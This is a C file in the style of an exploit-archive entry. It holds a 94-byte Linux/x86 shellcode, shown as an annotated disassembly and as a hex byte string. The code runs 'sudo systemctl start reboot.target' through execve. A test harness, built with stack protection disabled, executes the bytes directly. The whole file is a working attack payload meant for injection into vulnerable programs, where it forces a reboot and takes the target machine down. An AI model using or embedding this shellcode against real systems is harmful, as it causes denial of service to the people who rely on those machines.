/*
# Title : Linux/x86 - sudo systemctl start reboot.target (94 bytes)
# Author: Goutham Madhwaraj
# Description : Simple system reboot shellcode using systemd init system
		> works only on OS with systemd initialization system
# Date : 26/10/2018
# Tested on: i686 GNU/Linux(kali 4.12)
# Shellcode Length: 94
# to run : gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
           ./shellcode

Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	31 d2                	xor    edx,edx
 8048084:	50                   	push   eax
 8048085:	68 73 75 64 6f       	push   0x6f647573
 804808a:	68 62 69 6e 2f       	push   0x2f6e6962
 804808f:	68 2f 2f 2f 2f       	push   0x2f2f2f2f
 8048094:	68 2f 75 73 72       	push   0x7273752f
 8048099:	89 e3                	mov    ebx,esp
 804809b:	50                   	push   eax
 804809c:	68 6d 63 74 6c       	push   0x6c74636d
 80480a1:	68 79 73 74 65       	push   0x65747379
 80480a6:	68 2f 2f 2f 73       	push   0x732f2f2f
 80480ab:	68 2f 62 69 6e       	push   0x6e69622f
 80480b0:	89 e1                	mov    ecx,esp
 80480b2:	50                   	push   eax
 80480b3:	6a 74                	push   0x74
 80480b5:	68 61 72 67 65       	push   0x65677261
 80480ba:	68 6f 74 2e 74       	push   0x742e746f
 80480bf:	68 72 65 62 6f       	push   0x6f626572
 80480c4:	89 e6                	mov    esi,esp
 80480c6:	50                   	push   eax
 80480c7:	6a 74                	push   0x74
 80480c9:	68 73 74 61 72       	push   0x72617473
 80480ce:	89 e7                	mov    edi,esp
 80480d0:	50                   	push   eax
 80480d1:	56                   	push   esi
 80480d2:	57                   	push   edi
 80480d3:	51                   	push   ecx
 80480d4:	53                   	push   ebx
 80480d5:	89 e1                	mov    ecx,esp
 80480d7:	50                   	push   eax
 80480d8:	89 e2                	mov    edx,esp
 80480da:	b0 0b                	mov    al,0xb
 80480dc:	cd 80                	int    0x80

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xd2\x50\x68\x73\x75\x64\x6f\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x68\x2f\x75\x73\x72\x89\xe3\x50\x68\x6d\x63\x74\x6c\x68\x79\x73\x74\x65\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe1\x50\x6a\x74\x68\x61\x72\x67\x65\x68\x6f\x74\x2e\x74\x68\x72\x65\x62\x6f\x89\xe6\x50\x6a\x74\x68\x73\x74\x61\x72\x89\xe7\x50\x56\x57\x51\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
